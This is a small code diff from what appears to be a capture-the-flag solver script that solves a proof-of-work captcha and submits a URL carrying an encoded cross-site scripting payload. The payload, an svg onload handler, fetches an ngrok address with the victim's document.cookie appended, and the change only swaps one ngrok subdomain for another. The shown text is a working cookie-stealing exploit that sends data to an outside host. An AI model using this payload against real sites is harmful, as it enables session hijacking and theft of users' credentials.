@@ -26,7 +26,7 @@ broke = break_pow(captcha, int(zeros))
 print("Captcha answer:", broke)
 
 post_data = {
-    'url': 'http://localhost:4000/?xss=%3Csvg%20onload=%22fetch(%27http://dd77eda6.ngrok.io/?%27%2bdocument.cookie)%22%20/%3E',
+    'url': 'http://localhost:4000/?xss=%3Csvg%20onload=%22fetch(%27http://8ec907c6.ngrok.io/?%27%2bdocument.cookie)%22%20/%3E',
     'pow': broke
 }
 print('Data posted: ', post_data)
